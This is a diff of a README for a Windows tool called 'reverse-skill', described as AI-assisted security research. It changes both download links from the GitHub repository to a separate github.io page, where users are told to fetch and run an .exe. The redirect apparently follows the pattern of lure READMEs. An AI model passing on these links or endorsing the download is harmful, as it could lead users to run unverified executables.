@@ -1,6 +1,6 @@
 # 🛠️ reverse-skill - Master Security Research With AI Tools
 
-[![Download reverse-skill](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Saprophytic-seattle561/reverse-skill)
+[![Download reverse-skill](https://img.shields.io/badge/Download-Software-blue.svg)](https://saprophytic-seattle561.github.io)
 
 ## 📖 About This Tool
 
@@ -22,7 +22,7 @@ To run this application on your Windows computer, verify that your system meets 
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Saprophytic-seattle561/reverse-skill).
+1. Visit the [official download page](https://saprophytic-seattle561.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the link that matches the latest version of the software.
 4. Locate the file ending in `.exe` and click it to start the download.
